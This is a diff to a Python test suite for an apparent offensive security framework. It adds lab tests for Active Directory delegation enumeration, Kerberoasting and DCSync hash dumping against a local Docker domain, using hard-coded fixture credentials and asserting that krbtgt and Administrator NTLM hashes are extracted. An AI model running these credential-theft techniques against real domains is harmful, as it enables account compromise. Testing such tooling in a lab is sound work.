@@ -450,9 +450,12 @@ class TestAdEnumLab(unittest.TestCase):
                                  f"machine account leaked into users: {line}")
             # kerberoastable loot records the SPN itself
             roast = console.store.loot("kerberoastable")
-            self.assertEqual(len(roast), 1)
-            self.assertIn("backup_svc", roast[0]["content"])
-            self.assertIn("HTTP/web.forge.local", roast[0]["content"])
+            self.assertEqual(len(roast), 2)  # backup_svc + web_svc fixtures
+            contents = "\n".join(r["content"] for r in roast)
+            self.assertIn("backup_svc", contents)
+            self.assertIn("HTTP/web.forge.local", contents)
+            self.assertIn("web_svc", contents)
+            self.assertIn("HTTP/intranet.forge.local", contents)
             creds = console.store.creds()
             self.assertEqual(len(creds), 1)
             self.assertEqual(creds[0]["service"], "ldap")
@@ -563,9 +566,10 @@ class TestRoastLab(unittest.TestCase):
         )
         self.assertIn("$krb5tgs$", out)
         self.assertIn("backup_svc", out)
-        self.assertEqual(len(hashes), 1)
-        self.assertIn("$krb5tgs$", hashes[0]["content"])
-        self.assertIn("backup_svc", hashes[0]["label"])
+        self.assertEqual(len(hashes), 2)  # backup_svc + web_svc fixtures
+        labels = " ".join(h["label"] for h in hashes)
+        self.assertIn("backup_svc", labels)
+        self.assertIn("web_svc", labels)
 
     def test_asreproast_graceful_when_kdc_refuses(self):
         # The Samba AD KDC in this build does not honor
@@ -582,6 +586,178 @@ class TestRoastLab(unittest.TestCase):
         )
         self.assertNotIn("Traceback", out)
         self.assertIn("0/2 roastable", out)
+        self.assertEqual(hashes, [])
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestDelegationLab(unittest.TestCase):
+    """delegation against the AD lab's delegation fixtures."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.ldap import ldap as impacket_ldap
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("ad")
+        deadline = time.time() + 120
+        while time.time() < deadline:
+            try:
+                conn = impacket_ldap.LDAPConnection("ldap://127.0.0.1")
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                break
+            except Exception:
+                time.sleep(2)
+        else:
+            cls.manager.down("ad")
+            raise RuntimeError("AD lab did not provision within 120s")
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            return buf.getvalue(), console.store.loot("delegation")
+        finally:
+            console.store.close()
+
+    def test_finds_all_delegation_kinds(self):
+        # analyst is a normal user — any domain cred can read delegation
+        out, loot = self._run(
+            "use auxiliary/enum/delegation",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME analyst",
+            "set PASSWORD Summer2024!",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("unconstrained", out)
+        self.assertIn("constrained (protocol transition)", out)
+        self.assertIn("rbcd-target", out)
+        self.assertIn("HTTP/api.forge.local", out)
+        # healthy accounts are not flagged
+        self.assertNotIn("analyst:", out)
+        # loot collates per account
+        by_label = {entry["label"].split(" @ ")[0]: entry["content"]
+                    for entry in loot}
+        self.assertIn("backup_svc", by_label)
+        self.assertIn("web_svc", by_label)
+        self.assertIn("unconstrained", by_label["backup_svc"])
+        self.assertIn("rbcd-target", by_label["backup_svc"])
+        self.assertIn("constrained (protocol transition)", by_label["web_svc"])
+
+    def test_unreachable_dc_clean_error(self):
+        out, _ = self._run(
+            "use auxiliary/enum/delegation",
+            "set RHOSTS 127.0.0.2",  # nothing listens on 389 there
+            "set DOMAIN forge.local",
+            "set USERNAME Administrator",
+            "set PASSWORD P@ssw0rd123",
+            "run",
+        )
+        self.assertIn("failed", out.lower())
+        self.assertNotIn("Traceback", out)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestDcSyncLab(unittest.TestCase):
+    """dcsync against the AD lab: Administrator replicates the directory.
+    Exercises the pinned RPC range (135 + 49152-49160) end to end."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.ldap import ldap as impacket_ldap
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("ad")
+        # docker-proxy accepts on 445 the moment the container starts, long
+        # before provisioning finishes — wait for a real LDAP bind instead
+        deadline = time.time() + 120
+        while time.time() < deadline:
+            try:
+                conn = impacket_ldap.LDAPConnection("ldap://127.0.0.1")
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                break
+            except Exception:
+                time.sleep(2)
+        else:
+            cls.manager.down("ad")
+            raise RuntimeError("AD lab did not provision within 120s")
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            return buf.getvalue(), console.store.loot("hash")
+        finally:
+            console.store.close()
+
+    def test_syncs_directory_hashes(self):
+        out, hashes = self._run(
+            "use auxiliary/attack/dcsync",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME Administrator",
+            "set PASSWORD P@ssw0rd123",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        labels = " ".join(h["label"] for h in hashes)
+        contents = "\n".join(h["content"] for h in hashes)
+        for name in ("Administrator", "krbtgt", "analyst", "backup_svc"):
+            self.assertIn(name, labels)
+        # hashcat NTLM format: user:rid:lm:nt:::
+        self.assertRegex(contents,
+                         r"Administrator:500:[0-9a-f]{32}:[0-9a-f]{32}:::")
+        # and the replicated hash is REAL — analyst's NT(Summer2024!)
+        from Cryptodome.Hash import MD4
+        expected = MD4.new("Summer2024!".encode("utf-16-le")).hexdigest()
+        self.assertIn(expected, contents)
+
+    def test_target_limits_sync(self):
+        out, hashes = self._run(
+            "use auxiliary/attack/dcsync",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME Administrator",
+            "set PASSWORD P@ssw0rd123",
+            "set TARGET krbtgt",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertEqual(len(hashes), 1)
+        self.assertIn("krbtgt", hashes[0]["label"])
+
+    def test_low_priv_user_denied(self):
+        # analyst holds no replication rights — clean failure, zero hashes
+        out, hashes = self._run(
+            "use auxiliary/attack/dcsync",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME analyst",
+            "set PASSWORD Summer2024!",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
         self.assertEqual(hashes, [])
 
 
